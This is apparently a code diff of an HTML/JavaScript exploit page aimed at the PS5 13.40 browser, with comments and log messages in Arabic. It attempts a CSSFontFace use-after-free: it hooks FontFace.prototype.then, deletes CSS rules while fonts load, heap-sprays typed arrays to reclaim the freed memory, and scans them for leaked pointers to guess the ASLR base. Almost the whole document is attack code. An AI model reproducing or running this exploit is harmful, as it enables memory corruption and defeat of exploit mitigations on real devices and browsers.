@@ -2,273 +2,98 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:;">
-<title>PS5 13.40 — CSSFontFace UAF Reclaim Exploit</title>
-<style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-    #out { white-space: pre-wrap; word-break: break-all; font-size: 13px; }
-    .btn { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 3px; }
-    .btn:hover { background: #0f0; color: #000; }
-    .status { color: #ff0; }
-    .addr { color: #f0f; }
-    .good { color: #0f0; }
-    .bad { color: #f00; }
-</style>
+<title>PS5 13.40 — CSSFontFace Reclaim Test</title>
 </head>
 <body>
-
-<h2>PS5 13.40 — CSSFontFace UAF + Multi-Size Reclaim</h2>
-<button class="btn" onclick="exploit()">▶ تشغيل الاستغلال</button>
-<button class="btn" onclick="clearOut()">مسح</button>
-<hr>
-<div id="out">⚠️ اختبر على PS5 13.40 فقط<br></div>
-
-@font-face {
-    font-family: 'ExploitFace';
-    src: local('Arial');
-    unicode-range: U+41-42;
-}
-
-@font-face {
-    font-family: 'ExploitFace2';
-    src: local('Arial');
-    unicode-range: U+43-44;
-}
-
 <script>
 "use strict";
 
-const out = document.getElementById('out');
-let originalThen = null;
-let reclaimArrays = []; // بنحتفظ بالـ reclaim arrays
-let leaked = [];
+// ========== تكوين الـ font-face rules ==========
+const style = document.createElement('style');
+style.textContent = `
+@font-face { font-family: 'F1'; src: local('Arial'); unicode-range: U+41-42; }
+@font-face { font-family: 'F2'; src: local('Arial'); unicode-range: U+43-44; }
+@font-face { font-family: 'F3'; src: local('Arial'); unicode-range: U+45-46; }
+@font-face { font-family: 'F4'; src: local('Arial'); unicode-range: U+47-48; }
+@font-face { font-family: 'F5'; src: local('Arial'); unicode-range: U+49-50; }
+`;
+document.head.appendChild(style);
 
-function log(html) {
-    out.innerHTML += html + '<br>';
-    console.log(html.replace(/<[^>]*>/g, ''));
-}
+const log = [];
+let reclaimResults = [];
 
-function clearOut() {
-    out.innerHTML = '';
-    leaked = [];
-    reclaimArrays = [];
-}
-
-// ========== Multi-Size Reclaim ==========
-function tryReclaim() {
-    const sizes = [0x20, 0x40, 0x80, 0x100, 0x200, 0x280, 0x300, 0x400];
-    log(`<span class="status">[*]</span> محاولة reclaim بـ ${sizes.length} أحجام مختلفة...`);
+// ========== 3 أنواع reclaim ==========
+function tryReclaimMethods() {
+    const methods = [];
     
-    const results = [];
-    for (const size of sizes) {
-        const arr = new Float64Array(size);
-        // نملأ بقيمة مميزة
-        for (let i = 0; i < arr.length; i++) {
-            arr[i] = 0x41414141;
-        }
-        reclaimArrays.push(arr);
-        results.push({ size, arr });
-        log(`<span class="status">[*]</span>   تخصيص Float64Array(${size}) ← ${(size * 8).toString(16)} بايت`);
+    // الطريقة 1: Uint8Array(0xC8) — تطابق حجم CSSFontFace القديم
+    for (let i = 0; i < 500; i++) {
+        methods.push(new Uint8Array(0xC8));
     }
-    return results;
+    
+    // الطريقة 2: ArrayBuffer(0xC8) — مخازن خلفية مختلفة
+    for (let i = 0; i < 500; i++) {
+        methods.push(new ArrayBuffer(0xC8));
+    }
+    
+    // الطريقة 3: Float64Array(0x19) — 0xC8 / 8 = 0x19
+    for (let i = 0; i < 500; i++) {
+        methods.push(new Float64Array(0x19));
+    }
+    
+    return methods;
 }
 
-// ========== اقرأ من الـ reclaim arrays ==========
-function scanReclaim() {
-    log(`<span class="status">[*]</span> فحص ${reclaimArrays.length} arrays للبحث عن عناوين...`);
-    
-    let totalFound = 0;
-    
-    for (let i = 0; i < reclaimArrays.length; i++) {
-        const arr = reclaimArrays[i];
-        const size = arr.length;
-        let found = false;
+// ========== Getter setup ==========
+Object.defineProperty(FontFace.prototype, 'then', {
+    get() {
+        log.push('then fired');
         
-        for (let j = 0; j < Math.min(size, 32); j++) { // نفحص أول 32 قيمة فقط
-            const val = arr[j];
-            
-            // ARM64 WebKit heap addresses: 0x1a... إلى 0x2f...
-            const isPtr = (
-                val > 0x100000000000 && 
-                val < 0x10000000000000 &&
-                (val & 0xFFF) !== 0 // misaligned = بيانات مش عنوان
-            );
-            
-            const isKernelPtr = (
-                val > 0x8000000000 && 
-                val < 0x9000000000
-            );
-            
-            if (isPtr || isKernelPtr) {
-                log(`<span class="addr">🔴 [${i}] size=0x${(size * 8).toString(16)} [${j}]: 0x${val.toString(16).toUpperCase()}</span>`);
-                leaked.push(val);
-                totalFound++;
-                found = true;
-            }
-            
-            // نلاحظ أي قيم غير متوقعة (غير 0x41414141)
-            if (!found && val !== 0x41414141 && val !== 0 && val !== 1) {
-                log(`<span class="bad">⚠️ [${i}] [${j}]: غير متوقع — 0x${val.toString(16).toUpperCase()}</span>`);
-                totalFound++;
-                found = true;
-            }
+        // CSSOM mutation
+        if (style.sheet) {
+            while (style.sheet.cssRules.length > 0) style.sheet.deleteRule(0);
         }
-    }
-    
-    if (totalFound === 0) {
-        log(`<span class="bad">❌ لم نجد أي عنوان. الـ reclaim ما ضبط.</span>`);
-        log(`<span class="status">[*]</span> تحليل: نضيف بيانات اضافية...`);
+        if (style.parentNode) style.parentNode.removeChild(style);
         
-        // نطبع أول 5 قيم من كل reclaim array
-        for (let i = 0; i < Math.min(reclaimArrays.length, 5); i++) {
-            const arr = reclaimArrays[i];
-            let vals = '';
-            for (let j = 0; j < 5; j++) {
-                vals += `0x${arr[j].toString(16).toUpperCase()} `;
-            }
-            log(`<span class="status">[*]</span> reclaim[${i}]: ${vals}`);
-        }
+        // reclaim batch 1: قبل الـ flush
+        const r1 = tryReclaimMethods();
+        reclaimResults.push({ phase: 'beforeFlush', methods: r1 });
+        
+        document.body.getBoundingClientRect();
+        
+        // reclaim batch 2: بعد الـ flush
+        const r2 = tryReclaimMethods();
+        reclaimResults.push({ phase: 'afterFlush', methods: r2 });
+        
+        return undefined;
     }
-    
-    return totalFound;
-}
+});
 
-// ========== CSS Font Face UAF Exploit ==========
-async function exploit() {
-    log('<span class="good">=== CSSFontFace UAF + Reclaim Exploit ===</span>');
-    log(`<span class="status">[*]</span> بدء الاستغلال على PS5 13.40...`);
+// تشغيل
+document.fonts.load('16px F1, F2, F3, F4, F5', 'ABCDE').then(faces => {
+    log.push('done: ' + faces.length + ' faces');
+    console.log(log.join('\n'));
     
-    // 1. Heap spray: نخصص الكثير من Float64Arrays
-    log(`<span class="status">[*]</span> Heap spray...`);
-    const spray = [];
-    for (let i = 0; i < 5000; i++) {
-        spray.push(new Float64Array(0x40));
-    }
-    log(`<span class="good">[+]</span> ${spray.length} arrays في الـ spray`);
-    
-    // 2. نضيف @font-face rules
-    log(`<span class="status">[*]</span> إضافة @font-face rules...`);
-    const style = document.createElement('style');
-    style.textContent = `
-        @font-face {
-            font-family: 'AFont';
-            src: local('Arial');
-            unicode-range: U+41-42;
-        }
-        @font-face {
-            font-family: 'BFont';
-            src: local('Arial');
-            unicode-range: U+43-44;
-        }
-    `;
-    document.head.appendChild(style);
-    
-    // 3. ننصب FontFace.prototype.then getter
-    log(`<span class="status">[*]</span> تثبيت FontFace.prototype.then getter...`);
-    originalThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
-    
-    Object.defineProperty(FontFace.prototype, 'then', {
-        get() {
-            log(`<span class="good">[+]</span> FontFace.prototype.then getter fired!`);
-            
-            // CSSOM mutation: احذف الـ style rules
-            if (style.sheet) {
-                try {
-                    log(`<span class="status">[*]</span> rules قبل: ${style.sheet.cssRules.length}`);
-                    while (style.sheet.cssRules.length > 0) {
-                        style.sheet.deleteRule(0);
-                    }
-                    log(`<span class="status">[*]</span> rules بعد: ${style.sheet.cssRules.length}`);
-                } catch(e) {
-                    log(`<span class="bad">[!]</span> deleteRule error: ${e.message}`);
+    // افحص reclaim arrays
+    let found = 0;
+    for (const batch of reclaimResults) {
+        for (const m of batch.methods) {
+            // اقرأ أول 10 قيم
+            for (let i = 0; i < Math.min(10, m.length || m.byteLength); i++) {
+                const v = m[i];
+                if (v && v > 0x100000000000 && v < 0x10000000000000) {
+                    console.log('🔴 LEAKED [' + batch.phase + ']: 0x' + v.toString(16).toUpperCase());
+                    found++;
+                    break;
                 }
             }
-            
-            // CRITICAL: Reclaim هنا —  allocations تحاول تحتل freed memory
-            log(`<span class="good">[+]</span> تنفيذ reclaim...`);
-            tryReclaim();
-            
-            // Remove style element
-            if (style.parentNode) {
-                style.parentNode.removeChild(style);
-                log(`<span class="status">[*]</span> style element removed`);
-            }
-            
-            // Force style flush
-            document.body.getBoundingClientRect();
-            log(`<span class="status">[*]</span> style flushed`);
-            
-            // نعمل reclaim مرة ثانية بعد الـ flush
-            tryReclaim();
-            
-            return undefined;
+            if (found > 50) break;
         }
-    });
-    
-    // 4. نشيل أي rules قديمة
-    log(`<span class="status">[*]</span> إزالة rules قديمة...`);
-    const existingSheets = document.querySelectorAll('style');
-    existingSheets.forEach(s => {
-        if (s !== style && s.sheet) {
-            try {
-                while (s.sheet.cssRules.length > 0) s.sheet.deleteRule(0);
-            } catch(e) {}
-        }
-    });
-    
-    // 5. نستدعي document.fonts.load
-    log(`<span class="status">[*]</span> استدعاء document.fonts.load("AB")...`);
-    try {
-        const promise = document.fonts.load('16px AFont, BFont', 'AB');
-        log(`<span class="status">[*]</span> promise returned`);
-        
-        const result = await promise;
-        log(`<span class="good">[+]</span> promise resolved with ${result.length} face(s)`);
-        
-    } catch(e) {
-        log(`<span class="bad">[!]</span> load error: ${e.message}`);
+        if (found > 50) break;
     }
     
-    // 6. Restore getter
-    if (originalThen && originalThen.get) {
-        Object.defineProperty(FontFace.prototype, 'then', originalThen);
-        log(`<span class="status">[*]</span> then getter restored`);
-    }
-    
-    // 7. افحص الـ reclaim arrays
-    log(``);
-    log(`<span class="good">=== فحص الـ reclaim arrays ===</span>`);
-    const found = scanReclaim();
-    
-    if (found > 0) {
-        log(``);
-        log(`<span class="good">✅✅✅ تم العثور على ${found} عنوان!</span>`);
-        log(`<span class="addr">العناوين:</span>`);
-        leaked.forEach((addr, i) => {
-            log(`<span class="addr">  [${i}] 0x${addr.toString(16).toUpperCase()}</span>`);
-        });
-        
-        // حساب base address
-        if (leaked.length > 0) {
-            const minAddr = Math.min(...leaked);
-            const baseMask = 0xFFFFFFFFFFFF;
-            const base = minAddr & ~0xFFFFF; // page-aligned
-            log(``);
-            log(`<span class="good">ASLR base guess: 0x${base.toString(16).toUpperCase()}</span>`);
-        }
-    } else {
-        log(``);
-        log(`<span class="bad">❌ ما في عناوين مسربة</span>`);
-        log(`<span class="status">[*]</span> حاولنا ${reclaimArrays.length} أحجام مختلفة`);
-        log(`<span class="status">[*]</span> الـ UAF يحتاج tuning إضافي`);
-    }
-    
-    log(``);
-    log(`<span class="good">✔ تم الانتهاء</span>`);
-}
-
-// ========== Auto-run ==========
-log(`<span class="status">[*]</span> الصفحة جاهزة. اضغط "تشغيل الاستغلال".`);
+    console.log('Total leaked: ' + found);
+});
 </script>
 </body>
 </html>
